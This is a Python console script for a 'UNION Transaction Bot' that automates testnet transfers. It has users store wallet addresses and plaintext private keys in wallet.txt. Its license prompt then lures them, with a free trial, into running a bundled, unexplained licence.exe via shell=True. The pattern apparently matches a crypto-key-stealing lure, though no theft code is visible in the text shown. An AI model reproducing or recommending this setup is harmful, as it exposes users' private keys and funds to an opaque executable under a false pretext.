#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import os
import sys
from datetime import datetime
import subprocess

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("""
  _   _ _   _ ___ _____   ___           _   
 | | | | | | |_ _|_   _| |_ _|_ __  ___| |_ 
 | |_| | | | || |  | |    | || '_ \/ __| __|
 |  _  | |_| || |  | |    | || | | \__ \ |_ 
 |_| |_|\___/|___| |_|   |___|_| |_|___/\__|
    """)
    print("UNION Transaction Bot")
    print("─" * 44)
    print("Union Testnet Transfer - Demo Version")
    print("Fast and safe solution for testnet transfers.")
    print("─" * 44)

def print_step_info(info):
    clear_console()
    print_banner()
    print(f"\n{info}")
    print("─" * 44)

def print_continue(msg="Press Enter to continue..."):
    input(f"{msg}")

def check_python_version():
    print_step_info("Checking Python version...")
    if sys.version_info < (3, 7):
        print(f"Python 3.7 or higher is required! Current version: {sys.version.split()[0]}")
        print("Please update Python: https://www.python.org/downloads/")
        print_continue()
        sys.exit(1)
    else:
        print(f"Python version OK: {sys.version.split()[0]}")
        print_continue()

def install_requirements():
    print_step_info("Checking and installing requirements...")
    if not os.path.exists("requirements.txt"):
        print("requirements.txt not found. Please install requirements manually.")
        print_continue()
        return
    try:
        try:
            import pkg_resources
        except ImportError:
            print("'pkg_resources' module missing. Installing 'setuptools'...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "setuptools"])
                import pkg_resources
                print("'setuptools' installed.")
            except Exception as e:
                print("'setuptools' could not be installed. Please run:")
                print("   pip install setuptools")
                print_continue()
                return
        with open("requirements.txt", "r", encoding="utf-8") as f:
            required = set()
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    pkg = line.split('==')[0].lower() if '==' in line else line.split('>=')[0].lower() if '>=' in line else line.lower()
                    required.add(pkg)
        installed = {pkg.key for pkg in pkg_resources.working_set}
        missing = [pkg for pkg in required if pkg not in installed]
        if not missing:
            print("All requirements are already installed.")
            print_continue()
            return
        print(f"Missing packages: {', '.join(missing)}")
        print("Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        print("Requirements installed.")
        print_continue()
    except Exception as e:
        print(f"Requirements could not be installed! Error: {e}")
        print("Please run:")
        print("   pip install -r requirements.txt")
        print_continue()

def check_wallet_file():
    print_step_info("Checking wallet.txt file and format...")
    while True:
        if not os.path.exists("wallet.txt"):
            print("wallet.txt not found!")
            print("Create wallet.txt. Format:")
            print("address,private_key (e.g. 0x123...,abcdef1234567890)")
            print("One wallet per line. Example:")
            print("0x1234567890abcdef,abcdef1234567890")
            print_continue("After creating wallet.txt, press Enter...")
            continue
        with open("wallet.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            print("wallet.txt is empty! Please add a valid wallet.")
            print_continue("After editing wallet.txt, press Enter...")
            continue
        valid = False
        for line in lines:
            if ',' in line:
                address, priv = line.split(',', 1)
                if address.startswith('0x') and len(address) >= 10 and len(priv) >= 10:
                    valid = True
                    break
        if not valid:
            print("wallet.txt format is invalid! Each line should be:")
            print("0xWalletAddress,PrivateKey (e.g. 0x123...,abcdef1234567890)")
            print_continue("After fixing wallet.txt, press Enter...")
            continue
        print("wallet.txt is valid!")
        print_continue()
        break

def check_requirements():
    print("Checking required files...")
    missing_files = []
    if not os.path.exists("transfer.py"):
        missing_files.append("transfer.py")
    if not os.path.exists("wallet.txt"):
        missing_files.append("wallet.txt")
    if missing_files:
        print(f"Missing files: {', '.join(missing_files)}")
        print("Please create missing files and try again.")
        return False
    print("All required files are present!")
    return True

def license_prompt():
    clear_console()
    print_banner()
    print("You are using the unlicensed version for Union testnet transfers.")
    print("Only Holesky -> Sepolia transfers are allowed.")
    print("To use all networks, you must get a license.")
    print("To try the 24-hour trial version for all networks, press 'Y' and fill out the form.")
    print("─" * 44)
    while True:
        choice = input("Your choice (y/n): ").strip().lower()
        if choice == 'y':
            exe_path = os.path.abspath(os.path.join('licence', 'licence.exe'))
            exe_dir = os.path.dirname(exe_path)
            try:
                subprocess.run([exe_path], check=True, cwd=exe_dir, shell=True)
            except Exception as e:
                print(f"Could not run licence.exe: {e}")
                print(f"Tried path: {exe_path}")
            license_key = input("Enter your license key (or press Enter to continue without a key): ")
            if license_key.strip() == "":
                print("Continuing without license key...")
            else:
                print(f"License key entered: {license_key}")
            print_continue()
            return True
        elif choice == 'n':
            print("Continuing without license...")
            print_continue()
            return False
        else:
            print("Please enter 'y' or 'n'!")

def show_help():
    print("\nHELP MENU")
    print("─" * 44)
    print("1. Create wallet.txt:")
    print("   Format: address,private_key")
    print("   Example: 0x123...,abcdef...")
    print()
    print("2. transfer.py file must exist")
    print()
    print("3. Transaction settings:")
    print("   - Transaction count: 1-100")
    print("   - Wait time: 10-60 seconds")
    print()
    print("4. Security:")
    print("   - Keep your private keys safe")
    print("   - Use test wallets")
    print("   - Start with small amounts")
    print("─" * 44)

def get_user_input():
    print("\nTRANSACTION SETTINGS")
    print("─" * 44)
    while True:
        try:
            transaction_count = int(input("How many transactions? (1-100): "))
            if 1 <= transaction_count <= 100:
                break
            else:
                print("Enter a number between 1-100!")
        except ValueError:
            print("Enter a valid number!")
    while True:
        try:
            interval = int(input("Wait time between transactions (seconds) (10-60): "))
            if 10 <= interval <= 60:
                break
            else:
                print("Enter a value between 10-60 seconds!")
        except ValueError:
            print("Enter a valid number!")
    print(f"\nSummary:")
    print(f"   Total Transactions: {transaction_count}")
    print(f"   Wait Time: {interval} seconds")
    print(f"   Estimated Time: {transaction_count * interval} seconds ({transaction_count * interval / 60:.1f} minutes)")
    while True:
        confirm = input("\nStart? (y/n): ").lower()
        if confirm in ['y', 'yes']:
            return transaction_count, interval
        elif confirm in ['n', 'no']:
            print("Transactions cancelled.")
            return None, None
        else:
            print("Enter 'y' or 'n'!")

def run_transactions(transaction_count, interval):
    print(f"\nStarting transactions...")
    print(f"Start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("─" * 44)
    successful_transactions = 0
    failed_transactions = 0
    for i in range(transaction_count):
        print(f"\nTransaction {i+1}/{transaction_count}")
        print(f"Time: {datetime.now().strftime('%H:%M:%S')}")
        try:
            import transfer
            transfer.main()
            successful_transactions += 1
            print(f"Transaction {i+1} successful!")
        except Exception as e:
            failed_transactions += 1
            print(f"Transaction {i+1} failed: {e}")
        if i < transaction_count - 1:
            print(f"Waiting {interval} seconds...")
            time.sleep(interval)
    print("\n─" * 44)
    print("TRANSACTION SUMMARY")
    print("─" * 44)
    print(f"Successful: {successful_transactions}")
    print(f"Failed: {failed_transactions}")
    print(f"End: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("─" * 44)

def main():
    print_step_info("Setup and requirements info:")
    print("See README.md for all details.")
    print("Automatic setup will start.")
    print_continue()
    check_python_version()
    install_requirements()
    check_wallet_file()
    if not check_requirements():
        print_continue()
        return
    license_prompt()
    while True:
        print_step_info("MAIN MENU")
        print("1. Start Transactions")
        print("2. Help")
        print("3. Exit")
        choice = input("Your choice (1-3): ")
        if choice == "1":
            transaction_count, interval = get_user_input()
            if transaction_count and interval:
                run_transactions(transaction_count, interval)
                print_continue()
        elif choice == "2":
            show_help()
            print_continue()
        elif choice == "3":
            print("Exiting...")
            break
        else:
            print("Invalid choice! Enter a number between 1-3.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nStopped by user!")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
    finally:
        input("\nPress Enter to exit...") 